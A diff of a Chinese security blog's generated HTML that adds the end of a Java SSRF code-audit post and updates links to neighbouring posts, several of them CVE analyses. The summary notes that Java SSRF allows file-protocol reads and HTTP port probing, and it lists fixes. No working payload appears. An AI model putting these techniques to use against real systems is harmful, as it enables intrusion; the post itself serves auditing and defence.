+        <span class="token keyword">if</span> <span class="token punctuation">(</span>inputStream <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            inputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>outputStream <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            outputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>在java中，ssrf仅支持sun.net.<a target="_blank" rel="noopener" href="http://www.protocol下所有的协议,即http、https、file、mailto、jar和netdoc协议.所以java的ssrf并不能和php一样,可以通过gopher协议来扩展攻击面,因此java的ssrf利用方式比较局限.主要有以下两种利用方式/">www.protocol下所有的协议，即http、https、file、mailto、jar和netdoc协议。所以java的ssrf并不能和php一样，可以通过gopher协议来扩展攻击面，因此java的ssrf利用方式比较局限。主要有以下两种利用方式</a></p>
+<pre><code>1、利用file协议任意文件读取;
+2、利用http协议端口探测。</code></pre>
+<p>SSRF漏洞修复也很简单，主要有以下几点</p>
+<ul>
+<li>正确处理302跳转；</li>
+<li>限制协议只能为http/https，防止跨协议；</li>
+<li>设置内网ip为黑名单；</li>
+<li>在内网防火墙上设置常见的web端口白名单；</li>
+</ul>
 
                 
             </div>
@@ -596,7 +606,7 @@ Connection: close
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/11/25/cve-2020-10199-lou-dong-fen-xi/">http://example.com/2022/11/25/cve-2020-10199-lou-dong-fen-xi/</a>
+                    <a href="http://example.com/2022/11/30/java-dai-ma-shen-ji-zhi-ssrf/">http://example.com/2022/11/30/java-dai-ma-shen-ji-zhi-ssrf/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -809,13 +819,13 @@ Connection: close
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/11/30/java-dai-ma-shen-ji-zhi-ssrf/">
+                <a href="/2022/12/06/cve-2022-22963-lou-dong-fen-xi/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="java代码审计之SSRF">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="CVE-2022-22963漏洞分析">
                         
-                        <span class="card-title">java代码审计之SSRF</span>
+                        <span class="card-title">CVE-2022-22963漏洞分析</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -826,7 +836,7 @@ Connection: close
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-11-30
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-12-06
                         </span>
                         <span class="publish-author">
                             
@@ -858,13 +868,13 @@ Connection: close
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/11/23/burp-ssrf-cha-jian-kai-fa/">
+                <a href="/2022/11/25/cve-2020-10199-lou-dong-fen-xi/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="Burp SSRF插件开发">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="CVE-2020-10199漏洞分析">
                         
-                        <span class="card-title">Burp SSRF插件开发</span>
+                        <span class="card-title">CVE-2020-10199漏洞分析</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -875,14 +885,14 @@ Connection: close
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-23
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-25
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
-                                    渗透测试
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                    代码审计
                                 </a>
                             
                             
@@ -892,12 +902,8 @@ Connection: close
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/burpsuite/">
-                        <span class="chip bg-color">burpsuite</span>
-                    </a>
-                    
-                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-                        <span class="chip bg-color">渗透测试</span>
+                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">代码审计</span>
                     </a>
                     
                 </div>
